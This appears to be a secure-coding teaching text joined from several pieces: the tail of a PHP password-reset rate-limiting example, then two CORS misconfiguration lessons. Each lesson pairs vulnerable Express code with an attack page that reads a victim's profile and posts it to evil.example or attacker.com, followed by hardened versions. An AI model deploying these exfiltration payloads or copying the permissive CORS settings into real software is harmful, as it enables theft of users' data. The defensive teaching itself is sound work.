private const MAX_RESET_REQUESTS_PER_EMAIL = 3; // per hour
// Uses hashed email to avoid storing PII in Redis
$key = "password_reset:email:" . hash('sha256', $email);
```

3. **Token validation rate limiting with lockout**:
```php
// Prevents brute force attacks on reset tokens
if ($attempts >= self::MAX_TOKEN_ATTEMPTS_PER_IP) {
    $this->redis->setex("lockout:ip:{$ip}", 1800, '1'); // 30 min lockout
}
```

**Additional Protections**:
- **Constant-time responses**: All requests take 200-400ms regardless of user existence
- **Pattern detection**: Automatically locks out IPs requesting resets for many different emails
- **Token replay prevention**: Used tokens cached in Redis, checked before processing
- **Session invalidation**: All active sessions terminated after password change
- **Confirmation emails**: User notified when password changes, including requesting IP
- **Separate security logging**: Security events logged separately for SIEM integration
- **Transaction integrity**: Database operations wrapped in transaction for consistency
- **Password strength enforcement**: Validates against common passwords and complexity rules

Misconfigured CORS is a classic security misconfiguration: if you allow any origin and credentials, any attacker-controlled website can read authenticated responses from your API in the victim's browser.

**VULNERABLE CODE**:

```typescript
import express, { Request, Response } from 'express';
import cors from 'cors';

const app = express();
const PORT = 3000;

// ❌ Dangerous: overly permissive CORS for the entire API
app.use(cors({
  origin: '*',              // Allows any website
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['*'],    // Allows any headers
  credentials: true         // Sends cookies/Authorization headers
}));

// Simulated authenticated endpoint
app.get('/api/user/profile', (req: Request, res: Response) => {
  // In reality this would read user from session/cookie
  res.json({
    id: 123,
    email: 'user@example.com',
    ssn: '123-45-6789',
    apiKey: 'SECRET-API-KEY-123'
  });
});

app.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
});
```

**Attack Payload**:
```html
<!-- Attacker-controlled site hosted at https://evil.example -->
<!doctype html>
<html>
<body>
<script>
  // Victim is logged into https://api.example with cookies
  fetch('https://api.example/api/user/profile', {
    credentials: 'include'
  })
    .then(r => r.json())
    .then(data => {
      // Exfiltrate sensitive data to attacker
      fetch('https://evil.example/steal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    });
</script>
</body>
</html>
```

**Why This Is Dangerous**:
- `origin: '*'` with `credentials: true` lets any website read authenticated responses, enabling full data theft.
- Wildcard `allowedHeaders: ['*']` exposes your API to header-based tricks (e.g., custom auth headers) from untrusted origins.
- Global CORS config on `app.use` applies to all routes, including highly sensitive internal/admin endpoints.

**SECURE VERSION**:

```typescript
import express, { Request, Response, NextFunction } from 'express';
import cors, { CorsOptions } from 'cors';

const app = express();
const PORT = 3000;

// ✅ Only allow specific trusted front-end origins
const allowedOrigins = [
  'https://app.example.com',
  'https://admin.example.com'
];

const corsOptions: CorsOptions = {
  origin: (origin, callback) => {
    // Allow non-browser or same-origin (e.g., curl, Postman with no origin header)
    if (!origin) {
      return callback(null, true);
    }

    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }

    // Log and reject unknown origins
    console.warn(`Blocked CORS request from origin: ${origin}`);
    return callback(new Error('Not allowed by CORS'));
  },
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 600 // Cache preflight 10 minutes
};

// Apply CORS only to public API routes
app.use('/api', cors(corsOptions));

// Additional middleware for error handling
app.use(express.json());

// Simulated auth middleware
function requireAuth(req: Request, res: Response, next: NextFunction) {
  // In real code, verify session or token here
  const authHeader = req.headers['authorization'];
  if (!authHeader) {
    console.info(`Unauthorized request from IP ${req.ip}`);
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}

app.get('/api/user/profile', requireAuth, (req: Request, res: Response) => {
  // Return minimal data; keep highly sensitive data out of browser APIs
  res.json({
    id: 123,
    email: 'user@example.com',
    displayName: 'Demo User'
  });
});

// Centralized error handler (including CORS errors)
app.use((err: Error, _req: Request, res: Response, _next: NextFunction) => {
  console.error('Unhandled error:', err.message);
  // Do not leak internal error details
  res.status(500).json({ error: 'Internal server error' });
});

app.listen(PORT, () => {
  console.log(`Secure CORS server listening on http://localhost:${PORT}`);
});
```

**Key Security Controls**:
- **Restricted origins**: Only explicitly trusted front-end domains are allowed; unknown origins are rejected and logged.
- **Scoped CORS**: CORS is applied only to `/api` routes, reducing risk to internal or admin endpoints.
- **Error handling and minimal data exposure**: Centralized error handler avoids leaking details, and the API avoids sending highly sensitive fields (like SSNs or API keys) to browser clients at all.

In production you should treat CORS as one layer in a defense-in-depth strategy: environment-aware configuration, strict route scoping, robust logging/monitoring, and rate limiting to detect abuse.

**PRODUCTION PATTERN**:

```typescript
import express, { Request, Response, NextFunction } from 'express';
import cors, { CorsOptions } from 'cors';
import rateLimit from 'express-rate-limit';
import morgan from 'morgan';

const app = express();
const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';

// Environment-specific allowed origins
const originConfig: Record<string, string[]> = {
  development: ['http://localhost:5173', 'http://localhost:3001'],
  staging: ['https://staging.app.example.com'],
  production: ['https://app.example.com', 'https://admin.example.com']
};

const allowedOrigins = originConfig[NODE_ENV] || [];

const corsOptions: CorsOptions = {
  origin: (origin, callback) => {
    if (!origin) {
      // Non-browser clients (curl, Postman) allowed, but you can further restrict if needed
      return callback(null, true);
    }

    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }

    console.warn(`[CORS] Blocked origin: ${origin} (env=${NODE_ENV})`);
    return callback(new Error('Not allowed by CORS'));
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
  credentials: true,
  maxAge: 900
};

// Global middleware
app.use(express.json());

// HTTP request logging (redact sensitive data in real implementation)
app.use(morgan(NODE_ENV === 'production' ? 'combined' : 'dev'));

// Basic rate limiting for public API
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: NODE_ENV === 'production' ? 300 : 1000,
  standardHeaders: true,
  legacyHeaders: false,
  handler: (req: Request, res: Response) => {
    console.warn(`[RateLimit] Too many requests from IP ${req.ip}`);
    res.status(429).json({ error: 'Too many requests' });
  }
});

// Apply CORS only to browser-facing public API
app.use('/api/public', cors(corsOptions), apiLimiter);

// Auth middleware (simplified)
function requireAuth(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers['authorization'];
  if (!authHeader) {
    console.info(`[Auth] Unauthorized access attempt from IP ${req.ip}`);
    return res.status(401).json({ error: 'Unauthorized' });
  }
  (req as any).userId = 'user-123';
  next();
}

// PUBLIC API (CORS-enabled)
app.get('/api/public/profile', requireAuth, (req: Request, res: Response) => {
  const userId = (req as any).userId;
  console.info(`[API] profile requested for userId=${userId}`);
  res.json({
    id: userId,
    email: 'user@example.com',
    displayName: 'Demo User'
  });
});

// PRIVATE/INTERNAL API (NO CORS, internal network or service-to-service only)
app.get('/internal/health', (_req: Request, res: Response) => {
  res.json({ status: 'ok', env: NODE_ENV });
});

// ADMIN API (NO CORS, protected behind VPN / admin SSO)
app.post('/admin/reload-config', (req: Request, res: Response) => {
  // Intentionally no CORS: should never be callable from browsers
  console.warn('[Admin] Config reload requested');
  // In real system, enforce strong auth (mTLS, SSO, etc.)
  res.json({ status: 'reload-triggered' });
});

// Security headers for all responses
app.use((req: Request, res: Response, next: NextFunction) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  if (NODE_ENV === 'production') {
    res.setHeader('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');
  }
  next();
});

// Central error handler
app.use((err: Error, req: Request, res: Response, _next: NextFunction) => {
  console.error(`[Error] ${err.message}`, { path: req.path, ip: req.ip });
  if (err.message === 'Not allowed by CORS') {
    return res.status(403).json({ error: 'Origin not allowed' });
  }
  res.status(500).json({ error: 'Internal server error' });
});

app.listen(PORT, () => {
  console.log(`Env=${NODE_ENV} - server listening on port ${PORT}`);
});
```

**Defense in Depth Layers**:
1. **Environment-aware CORS configuration**:
   ```typescript
   const originConfig: Record<string, string[]> = { /* per-env origins */ };
   const allowedOrigins = originConfig[NODE_ENV] || [];
   ```
   Different origins for dev/staging/production prevent accidental exposure of production APIs to untrusted dev tools or test domains.

2. **Route-scoped CORS vs internal/admin routes**:
   ```typescript
   app.use('/api/public', cors(corsOptions), apiLimiter); // CORS enabled
   app.get('/internal/health', /* no CORS */);
   app.post('/admin/reload-config', /* no CORS */);
   ```
   Only routes intended for browser access have CORS; internal and admin endpoints are inaccessible from web pages.

3. **Rate limiting and centralized error handling**:
   ```typescript
   const apiLimiter = rateLimit({ /* ... */ });
   app.use((err: Error, req: Request, res: Response, _next: NextFunction) => {
     if (err.message === 'Not allowed by CORS') {
       return res.status(403).json({ error: 'Origin not allowed' });
     }
     res.status(500).json({ error: 'Internal server error' });
   });
   ```
   Limits abusive clients and ensures CORS misuses are handled with safe responses and logs for monitoring.

**Additional Protections**:
- **Strict security headers** to mitigate XSS, clickjacking, and protocol downgrade attacks, especially in production with HSTS.
- **Structured logging** of CORS blocks, auth failures, and rate-limit events for SIEM/monitoring to detect anomalous cross-origin access patterns.
- **Separation of concerns** by keeping sensitive admin and internal operations off any CORS-enabled paths and enforcing additional network and authentication controls (VPN, mTLS, SSO) around them.

CORS (Cross-Origin Resource Sharing) is a critical security mechanism, and misconfiguring it can expose your API to data theft from malicious websites. Let me show you the dangerous patterns first.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const app = express();

// DANGEROUS: Reflects any origin - allows any website to access your API
app.use((req, res, next) => {
  const origin = req.headers.origin;
  res.setHeader('Access-Control-Allow-Origin', origin || '*');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});

// DANGEROUS: Wildcard with credentials
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Credentials', 'true'); // Won't work, but intent is dangerous
  next();
});

// DANGEROUS: Regex that's too permissive
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && origin.match(/example\.com/)) {  // Matches evil-example.com too!
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  next();
});

app.get('/api/user/profile', (req, res) => {
  res.json({ email: 'user@company.com', ssn: '123-45-6789', balance: 50000 });
});

app.listen(3000);
```

**Attack Payload** (hosted on attacker's website):
```html
<script>
// Attacker's malicious page at https://evil-example.com
fetch('https://vulnerable-api.com/api/user/profile', {
  credentials: 'include'  // Sends victim's cookies
})
.then(response => response.json())
.then(data => {
  // Steal sensitive data
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)  // Exfiltrates: email, SSN, balance
  });
});
</script>
```

**Why This Is Dangerous**:
- Reflecting arbitrary origins allows ANY website to make authenticated requests to your API
- The `Access-Control-Allow-Credentials: true` header lets attackers include the victim's session cookies
- Permissive regex patterns like `/example\.com/` match substrings, not exact domains (evil-example.com passes)
- Attacker can read ALL response data from your API endpoints when victim visits their malicious site

**SECURE VERSION**:

```javascript
const express = require('express');
const cors = require('cors');
const app = express();

// Define explicit allowed origins
const ALLOWED_ORIGINS = [
  'https://app.example.com',
  'https://admin.example.com',
  'https://mobile.example.com'
];

// Add development origin only in non-production
if (process.env.NODE_ENV !== 'production') {
  ALLOWED_ORIGINS.push('http://localhost:3000');
}

const corsOptions = {
  origin: function(origin, callback) {
    // Allow requests with no origin (mobile apps, curl, etc) only if explicitly needed
    if (!origin) {
      // Decide based on your security requirements
      return callback(null, false);
    }

    // Strict exact-match check against whitelist
    if (ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      console.warn(`Blocked CORS request from: ${origin}`);
      callback(new Error('CORS policy violation'), false);
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400  // Cache preflight for 24 hours
};

app.use(cors(corsOptions));

app.get('/api/user/profile', (req, res) => {
  res.json({ email: 'user@company.com', name: 'John Doe' });
});

app.listen(3000);
```

**Key Security Controls**:
- **Explicit whitelist**: Only exact origin matches are allowed, no reflection or wildcards
- **Environment separation**: Development origins are not included in production builds
- **Logging blocked requests**: Security team can monitor for attack attempts
- **No null origin**: Requests without origin header are explicitly denied (prevents file:// attacks)

Allowing dynamic subdomains requires careful validation to prevent subdomain spoofing attacks. Here's a production-ready pattern with comprehensive security controls.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const cors = require('cors');
const winston = require('winston');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const app = express();

// Structured security logger
const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  defaultMeta: { service: 'cors-security' },
  transports: [
    new winston.transports.File({ filename: 'security-audit.log' }),
    new winston.transports.Console()
  ]
});

// Configuration from environment
const config = {
  allowedDomains: process.env.ALLOWED_DOMAINS?.split(',') || ['example.com'],
  allowedExactOrigins: process.env.ALLOWED_ORIGINS?.split(',') || [],
  environment: process.env.NODE_ENV || 'development',
  corsMaxAge: parseInt(process.env.CORS_MAX_AGE) || 600
};

// SECURE subdomain validator - prevents bypass attacks
function isAllowedOrigin(origin) {
  if (!origin) return false;

  try {
    const url = new URL(origin);
    const hostname = url.hostname.toLowerCase();
    const protocol = url.protocol;

    // MUST be HTTPS in production
    if (config.environment === 'production' && protocol !== 'https:') {
      return false;
    }

    // Check exact matches first
    if (config.allowedExactOrigins.includes(origin)) {
      return true;
    }

    // Secure subdomain matching with anchored check
    for (const domain of config.allowedDomains) {
      // Exact domain match (e.g., example.com)
      if (hostname === domain) {
        return true;
      }
      // Subdomain match (e.g., app.example.com, api.example.com)
      // CRITICAL: Use endsWith with dot prefix to prevent evil-example.com
      if (hostname.endsWith('.' + domain)) {
        return true;
      }
    }

    return false;
  } catch (e) {
    // Invalid URL - reject
    securityLogger.warn('Invalid origin URL', { origin, error: e.message });
    return false;
  }
}

// CORS configuration with comprehensive security
const corsOptions = {
  origin: function(origin, callback) {
    const requestId = Math.random().toString(36).substr(2, 9);

    // Log all CORS checks for audit
    securityLogger.info('CORS check', {
      requestId,
      origin: origin || 'null',
      timestamp: new Date().toISOString()
    });

    // Handle no-origin requests (same-origin, curl, mobile apps)
    if (!origin) {
      // In production, typically deny unless you have specific needs
      if (config.environment === 'production') {
        securityLogger.warn('Null origin request blocked in production', { requestId });
        return callback(null, false);
      }
      return callback(null, true);
    }

    if (isAllowedOrigin(origin)) {
      callback(null, true);
    } else {
      securityLogger.warn('CORS violation attempt', {
        requestId,
        blockedOrigin: origin,
        severity: 'HIGH',
        alertType: 'CORS_VIOLATION'
      });
      callback(new Error('CORS policy: Origin not allowed'), false);
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-Request-ID',
    'X-CSRF-Token'
  ],
  exposedHeaders: ['X-Request-ID', 'X-RateLimit-Remaining'],
  maxAge: config.corsMaxAge,
  optionsSuccessStatus: 204
};

// Security middleware stack
app.use(helmet({
  crossOriginResourcePolicy: { policy: 'same-site' },
  crossOriginOpenerPolicy: { policy: 'same-origin' }
}));

// Rate limiting for CORS preflight abuse
const preflightLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 100,
  message: 'Too many preflight requests',
  standardHeaders: true,
  handler: (req, res) => {
    securityLogger.warn('Rate limit exceeded', {
      ip: req.ip,
      origin: req.headers.origin
    });
    res.status(429).json({ error: 'Rate limit exceeded' });
  }
});

app.options('*', preflightLimiter);
app.use(cors(corsOptions));

// Request tracking middleware
app.use((req, res, next) => {
  req.requestId = req.headers['x-request-id'] || 
    Math.random().toString(36).substr(2, 9);
  res.setHeader('X-Request-ID', req.requestId);
  next();
});

// Protected API endpoint
app.get('/api/user/profile', (req, res) => {
  securityLogger.info('API access', {
    requestId: req.requestId,
    endpoint: '/api/user/profile',
    origin: req.headers.origin,
    userAgent: req.headers['user-agent']
  });

  res.json({ 
    email: 'user@company.com', 
    name: 'John Doe',
    requestId: req.requestId
  });
});

// Health check endpoint (no CORS restrictions needed)
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', environment: config.environment });
});

// Error handler
app.use((err, req, res, next) => {
  if (err.message.includes('CORS')) {
    securityLogger.error('CORS error', {
      error: err.message,
      origin: req.headers.origin,
      path: req.path
    });
    return res.status(403).json({ error: 'Forbidden' });
  }
  next(err);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  securityLogger.info('Server started', { 
    port: PORT, 
    environment: config.environment,
    allowedDomains: config.allowedDomains
  });
});
```

**Defense in Depth Layers**:

1. **Anchored domain matching**:
```javascript
// WRONG: hostname.includes('example.com') matches evil-example.com
// CORRECT: Check for exact match OR dot-prefixed subdomain
if (hostname === domain || hostname.endsWith('.' + domain)) {
  return true;  // Safe: evil-example.com won't match
}
```

2. **Protocol enforcement**:
```javascript
// Force HTTPS in production to prevent MITM attacks
if (config.environment === 'production' && protocol !== 'https:') {
  securityLogger.warn('HTTP origin rejected', { origin });
  return false;
}
```

3. **URL parsing with error handling**:
```javascript
try {
  const url = new URL(origin);
  // Safe parsing prevents injection via malformed URLs
} catch (e) {
  securityLogger.warn('Malformed origin rejected', { origin });
  return false;  // Reject invalid URLs
}
```

**Additional Protections**:
- **Helmet headers**: Adds `Cross-Origin-Resource-Policy` and `Cross-Origin-Opener-Policy` for additional isolation
- **Rate limiting**: Prevents preflight request abuse that could be used for reconnaissance
- **Audit logging**: Every CORS decision is logged with request IDs for incident response
- **Environment-aware config**: Production uses stricter settings loaded from environment variables
- **No wildcard + credentials**: The combination `Access-Control-Allow-Origin: *` with credentials is explicitly avoided (browsers block it anyway, but code clarity matters)
- **Request ID correlation**: Traces requests across services for debugging and security investigation

